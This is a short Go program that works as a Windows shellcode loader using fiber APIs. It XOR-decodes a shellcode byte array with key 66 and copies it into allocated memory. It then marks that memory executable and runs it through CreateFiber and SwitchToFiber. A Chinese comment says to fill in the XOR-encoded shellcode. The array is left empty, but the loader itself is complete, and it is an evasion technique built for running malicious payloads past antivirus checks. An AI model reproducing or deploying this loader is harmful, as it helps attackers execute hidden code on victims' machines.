package main

import (
	"my_createFiber/winApi"
	"unsafe"

	"github.com/JamesHovious/w32"
)

func main() {

	winApi.ProcConvertThreadToFiber()
//shellcode填入异或后的结果
	shellcode := []byte{}
	shellcodeAddr, _ := w32.VirtualAlloc(0, len(shellcode), w32.MEM_RESERVE|w32.MEM_COMMIT, w32.PAGE_READWRITE)
	for i := 0; i < len(shellcode); i++ {
		shellcode[i] ^= 66
	}
	winApi.ProcRtlCopyMemory(w32.PVOID(shellcodeAddr), w32.PVOID(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	var oldProtection w32.DWORD = 0
	w32.VirtualProtect(shellcodeAddr, len(shellcode), w32.PAGE_EXECUTE_READ, &oldProtection)

	fiberAddr := winApi.ProcCreateFiber(0, w32.PVOID(shellcodeAddr), w32.PVOID(unsafe.Pointer(nil)))

	winApi.ProcSwitchToFiber(w32.PVOID(fiberAddr))

}
